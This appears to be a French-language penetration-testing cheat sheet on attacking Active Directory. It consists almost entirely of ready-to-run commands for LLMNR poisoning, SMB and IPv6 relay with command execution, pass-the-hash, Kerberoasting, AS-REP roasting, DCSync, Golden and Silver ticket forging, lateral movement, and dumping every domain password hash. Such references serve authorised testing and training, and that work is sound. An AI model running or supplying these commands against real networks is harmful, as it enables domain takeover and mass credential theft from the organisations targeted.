# Active Directory Attacks

## Concepts cles

- **Domain Controller (DC)** : serveur qui gere l'AD
- **NTLM** : protocole d'authentification (hash NT)
- **Kerberos** : protocole d'authentification par tickets (TGT, TGS)
- **SPN** : Service Principal Name (lie un service a un compte)

## Enumeration AD

```bash
# Depuis Linux
enum4linux -a IP
ldapsearch -x -H ldap://DC_IP -b "dc=domaine,dc=com"
crackmapexec smb IP -u user -p pass --users
crackmapexec smb IP -u user -p pass --groups

# BloodHound
bloodhound-python -u user -p pass -d domaine.com -ns DC_IP -c all
# Puis importer dans BloodHound GUI
```

## Attaques initiales (sans credentials)

### LLMNR / NBT-NS Poisoning

```bash
# Responder - capturer des hashes NetNTLMv2
responder -I eth0 -dwPv

# Cracker le hash capture
hashcat -m 5600 hash.txt wordlist.txt
```

### SMB Relay

```bash
# Verifier que SMB signing est desactive
crackmapexec smb IP_RANGE --gen-relay-list targets.txt

# Lancer le relay
# 1. Modifier Responder : desactiver SMB et HTTP dans Responder.conf
# 2. Lancer ntlmrelayx
ntlmrelayx.py -tf targets.txt -smb2support

# Avec execution de commande
ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"
```

### IPv6 DNS Takeover (mitm6)

```bash
mitm6 -d domaine.com
# En parallele
ntlmrelayx.py -6 -t ldaps://DC_IP -wh fakepad.domaine.com -l loot
```

## Attaques avec credentials

### Pass-the-Hash

```bash
crackmapexec smb IP -u user -H HASH
psexec.py domaine/user@IP -hashes LMHASH:NTHASH
evil-winrm -i IP -u user -H HASH
wmiexec.py domaine/user@IP -hashes LMHASH:NTHASH
```

### Kerberoasting

```bash
# Demander des TGS pour les comptes avec SPN
GetUserSPNs.py domaine/user:password -dc-ip DC_IP -request

# Cracker le hash
hashcat -m 13100 hash.txt wordlist.txt
```

### AS-REP Roasting

```bash
# Comptes sans pre-authentification Kerberos
GetNPUsers.py domaine/ -usersfile users.txt -dc-ip DC_IP -no-pass

# Cracker
hashcat -m 18200 hash.txt wordlist.txt
```

### Token Impersonation

```bash
# Avec Metasploit (apres meterpreter)
load incognito
list_tokens -u
impersonate_token "DOMAINE\\admin"
```

### DCSync

```bash
# Necessite les droits Replicating Directory Changes
secretsdump.py domaine/user:password@DC_IP

# Avec Mimikatz
lsadump::dcsync /domain:domaine.com /user:Administrator
```

### Golden Ticket

```bash
# Avec Mimikatz - necessite le hash du compte krbtgt
kerberos::golden /user:fakeadmin /domain:domaine.com /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Avec Impacket
ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain domaine.com fakeadmin
export KRB5CCNAME=fakeadmin.ccache
psexec.py domaine.com/fakeadmin@DC -k -no-pass
```

### Silver Ticket

```bash
# Hash du compte de service + SPN
ticketer.py -nthash SERVICE_HASH -domain-sid S-1-5-21-... -domain domaine.com -spn CIFS/target.domaine.com user
```

## Mouvement lateral

```bash
psexec.py domaine/user:password@IP
wmiexec.py domaine/user:password@IP
smbexec.py domaine/user:password@IP
evil-winrm -i IP -u user -p password
xfreerdp /v:IP /u:user /p:password
```

## Post-exploitation AD

```bash
# Dump tous les hashes du domaine
secretsdump.py domaine/admin:password@DC_IP

# Dump NTDS.dit
crackmapexec smb DC_IP -u admin -p pass --ntds
```
